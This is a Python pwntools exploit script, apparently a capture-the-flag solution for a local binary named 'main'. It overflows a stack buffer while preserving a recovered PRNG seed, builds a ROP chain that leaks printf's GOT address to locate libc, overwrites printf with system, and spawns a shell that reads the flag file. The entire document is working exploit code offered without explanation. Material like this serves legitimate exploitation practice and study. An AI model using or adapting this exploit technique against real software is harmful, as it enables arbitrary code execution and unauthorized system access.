from pwn import * 
from z3 import * 

# seed = BitVec('seed', 64) 

# s = Solver() 
 
# value = [3008884726, 3904260370, 1355994690, 893439232, 3294122470, 
#             2951688604, 3806697543, 2424390622, 1224357370, 3884500081] 

# prng = [0] * 10 
# for i in range(0, 10, 2) : 
#     prng[i] = value[i/2] 
# for i in range(1, 10, 2) : 
#     prng[i] = value[5 + i/2]
    
# t = seed
# for i in range(10) : 
#     t = (t * 0x5deece66d + 11 ) % (1<<64)
#     s.add(RotateRight(t, 16) % (1<<32) == prng[i]) 

# print(s.check())  
# seed = int(str(s.model()[seed])) ^ 0x5deece66d 
seed = 12345678 
p = process("./main") 
e = ELF('./main')
libc =  ELF('/lib/x86_64-linux-gnu/libc.so.6')

# gadget 
pop_rdi = p64(0x400ab3)
pop_rsi_r15 = p64(0x400ab1) 
pop_rdx = p64(0x4007cb) 
main = 0x400822
bss = 0x6010a0 
ret = 0x400AB4

# gdb.attach(p, 'b* 0x4009f3') 
payload = 'a' * 0x14 + p64(seed) 
payload = payload.ljust(0x48, 'b') 

# leak libc 
payload += pop_rdi + p64(1)
payload += pop_rsi_r15 + p64(e.got['printf']) + p64(0) 
payload += pop_rdx + p64(0x8) 
payload += p64(e.plt['write'])


# overwrite printf -> system 
payload += pop_rdi + p64(0)
payload += pop_rsi_r15 + p64(e.got['printf']) + p64(0) 
payload += pop_rdx + p64(0x8) 
payload += p64(e.plt['read']) 

# read /bin/sh\x00 from stdin to bss 
payload += pop_rdi + p64(0)
payload += pop_rsi_r15 + p64(bss) + p64(0) 
payload += pop_rdx + p64(0x8) 
payload += p64(e.plt['read'])  

# get shell 
payload += pop_rdi + p64(bss) 
payload += p64(ret)
payload += p64(e.plt['printf'])

# sh.sendline('')

print(p.recv())
p.sendline(payload) 
printf_got = u64(p.recv())
libc.address = printf_got - libc.sym['printf']
system = libc.sym['__libc_system'] 

log.success("printf = " + hex(printf_got))
log.success('LIBC = ' + hex(libc.address))
log.success("system = " + hex(system))
p.send(p64(system)) 
p.send('/bin/sh\x00') 
p.sendline('/bin/cat flag')
p.interactive()
# 0x7fffffffdbb0 0x7fffffffdbf8